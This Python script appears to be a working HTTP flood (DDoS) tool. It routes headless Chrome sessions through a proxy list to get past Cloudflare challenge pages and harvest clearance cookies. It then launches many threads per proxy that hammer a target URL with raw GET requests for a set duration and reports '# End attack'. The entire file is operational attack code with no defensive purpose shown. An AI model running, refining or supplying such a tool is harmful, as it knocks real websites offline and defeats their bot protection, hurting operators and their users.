# -*- coding: utf-8 -*-
import threading, datetime, time, sys, socket, socks, ssl, requests, random
import undetected_chromedriver as webdriver
from selenium.webdriver.common.by import By
from urllib.parse import urlparse
import psutil
from colorama import Fore, init
from sys import stdout
init(convert=True)

config = {}
DELAY = False
DELAY_TIME = 0.1
SKIP = False
SUPERSKIP = False

lock = threading.Lock()

def get_cookie(proxy, url, thread_num, ua):
    global failed, success, total
    px = proxy.split(':')
    hidepx = px[0] + ".***.***.***:" + px[1]
    r = ""
    Bypass = True

    try:
        r = requests.get(url, proxies={'http': 'http://'+proxy, 'https': 'http://'+proxy}, timeout=30).text
    except requests.exceptions.RequestException as e:
        pass

    if 'CAPTCHA' in r:
        if SKIP:
            failed += 1
            stdout.write(f"#{thread_num} SKIPPED : {hidepx} All/Success/Fail[{total}/{success}/{failed}]\n")
            return
        stdout.write(f"#{thread_num} Get cookie : {hidepx} {Fore.RESET}")
        Bypass = True
    else:
        stdout.write("Not Found")
        pass

    if Bypass:
        options = webdriver.ChromeOptions()
        options.add_argument(f'--proxy-server={proxy}')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-setuid-sandbox')
        options.add_argument('--disable-infobars')
        options.add_argument('--disable-logging')
        options.add_argument('--disable-login-animations')
        options.add_argument('--disable-notifications')
        options.add_argument('--disable-gpu')
        options.add_argument('--incognito')
        options.add_argument('--headless')
        options.add_argument('--lang=ko_KR')
        options.add_argument("--start-maximized")
        options.add_argument(f'--user-agent={ua}')
        options.add_argument('--disable-extensions')  # 추가
        options.add_argument('--window-size=1920x1080')  # 추가
        options.add_argument('--disable-blink-features=AutomationControlled')  # 추가
        prefs = {
            "profile.managed_default_content_settings.images": 2,  # 이미지 차단
            "profile.managed_default_content_settings.stylesheets": 2,  # 스타일시트 차단
        }
        options.add_experimental_option("prefs", prefs)

        try:
            driver = webdriver.Chrome(options=options)
            driver.get(url)
            driver.implicitly_wait(10)

            wait = 0
            while 'Please Wait... | Cloudflare' in driver.title or 'Just a moment...' in driver.title or 'Attention Required! | Cloudflare' in driver.title:
                if wait >= 30:
                    driver.quit()
                    with lock:
                        failed += 1
                    stdout.write(f"#{thread_num} Failed : Proxy Connection Error(1) All/Success/Fail[{total}/{success}/{failed}]\n")
                    return
                try:
                    driver.find_element(By.XPATH, '//*[@id="cf-norobot-container"]/input').click()
                except:
                    pass
                time.sleep(1)
                wait += 1

            wait = 0
            while len(driver.get_cookies()) == 0:
                if wait >= 30:
                    driver.quit()
                    with lock:
                        failed += 1
                    stdout.write(f"#{thread_num} Failed : Proxy Connection Error(3) All/Success/Fail[{total}/{success}/{failed}]\n")
                    return
                time.sleep(1)
                wait += 1

            cookies = driver.get_cookies()
            for i in cookies:
                if i['name'] == 'cf_clearance' or i['name'] == '__cf_bm':
                    cookie = f"{i['name']}={i['value']}"
                    config[thread_num] = f"{proxy}---{cookie}---{ua}"
                    driver.quit()
                    with lock:
                        success += 1
                    stdout.write(f"{Fore.LIGHTGREEN_EX}#{thread_num} Success : {hidepx} All/Success/Fail[{total}/{success}/{failed}]{Fore.RESET}\n")
                    return
            driver.quit()
            with lock:
                failed += 1
            stdout.write(f"#{thread_num} Failed : Proxy Connection Error(2) All/Success/Fail[{total}/{success}/{failed}]\n")
        except Exception as e:
            with lock:
                failed += 1
            stdout.write(f"#{thread_num} Failed : Session Exception Error All/Success/Fail[{total}/{success}/{failed}]\n")
            print(e)

    else:
        config[thread_num] = f"{proxy}---None---{ua}"
        with lock:
            success += 1
        stdout.write(f"{Fore.LIGHTGREEN_EX}#{thread_num} Proxy Ready : {hidepx} All/Success/Fail[{total}/{success}/{failed}]{Fore.RESET}\n")

def r(proxy, cookie, url, ua, until):
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
    
    px = proxy.split(":")
    
    thread_count = 0
    while int(thread_count) < int(thr):
        try:
            threading.Thread(target=test, args=(px, cookie, target, ua, until)).start()
            thread_count += 1
        except:
            pass

def test(px, cookie, target, ua, until):
    req =  'GET / HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="111", "Google Chrome";v="111"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: document\r\n'
    req += 'sec-fetch-mode: navigate\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: '+ua + '\r\n\r\n\r\n'
    
    try:
        if target['scheme'] == 'https':
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))
            packet.connect((str(target['host']), int(target['port'])))
            packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
        else:
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))
            packet.connect((str(target['host']), int(target['port'])))
    except Exception as e:
        return
    
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
                time.sleep(0.001*int(interval))
                pass
        except:
            packet.close()
            pass

def kill():
    for proc in psutil.process_iter():
        try:
            if proc.name() == "chrome":
                try:
                    proc.kill()
                except:
                    pass
        except:
            pass

def main():
    global failed, success, total, thr
    failed, success, total, thread_num = 0, 0, 0, 0
    global interval
    url = sys.argv[1]
    until = sys.argv[2]
    thr = sys.argv[3]
    proxypath = sys.argv[4]
    interval = sys.argv[5]
    ua = open('./ua.txt', 'r').read().split('\n')
    for _ in open(proxypath, encoding="utf-8"):
        total += 1
    stdout.write(f"## Start with {total} proxies...\n")
    
    for line in open(proxypath, encoding="utf-8"):
        line = line.strip()
        thread_num += 1
        threading.Thread(target=get_cookie, args=(line, url, thread_num, random.choice(ua))).start()
        time.sleep(DELAY_TIME)
    
    while(failed+success != total):
        time.sleep(1)
    
    stdout.write("# Get Cookie Thread end\n")
    kill()
    until_time = datetime.datetime.now() + datetime.timedelta(seconds=int(until))
    
    for num in range(len(config)):
        try:
            proxy = config[num+1].split('---')[0]
            cookie = config[num+1].split('---')[1]
            ua = config[num+1].split('---')[2]
            thd = threading.Thread(target=r, args=(proxy, cookie, url, ua, until_time))
            thd.start()
        except Exception as e:
            pass

    time.sleep(int(until))
    stdout.write("# End attack\n")
    sys.exit()

if __name__ == '__main__':
    if len(sys.argv) < 6:
        stdout.write(f"user@some_name:~# python3 {sys.argv[0]} <target> <time> <thread> <proxy> <interval>\n")
        sys.exit()
    main()
